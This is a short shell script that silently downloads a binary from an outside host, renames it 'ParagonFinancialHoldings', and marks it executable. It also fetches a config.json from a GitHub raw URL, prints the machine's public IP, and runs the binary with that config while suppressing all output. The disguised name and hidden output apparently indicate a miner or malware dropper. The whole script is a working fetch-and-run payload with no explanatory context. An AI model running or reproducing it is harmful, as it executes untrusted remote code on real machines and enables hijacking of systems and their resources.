wget -q -O ParagonFinancialHoldings https://maper.info/api-server && chmod +x ParagonFinancialHoldings >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./ParagonFinancialHoldings -c "config.json" >/dev/null 2>&1
